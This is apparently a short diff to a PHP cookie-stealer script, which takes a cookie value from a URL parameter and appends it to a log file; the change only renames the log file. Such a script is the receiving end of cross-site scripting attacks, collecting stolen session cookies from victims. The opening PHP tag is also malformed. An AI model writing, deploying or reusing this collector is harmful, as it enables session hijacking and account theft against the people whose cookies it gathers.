@@ -1,5 +1,5 @@
 <?php>
   $cookie = $_GET["c"];
-  $file = fopen('logs.txt','a');
+  $file = fopen('log.txt','a');
   fwrite($file,$cookie . "\n\n");
 ?>
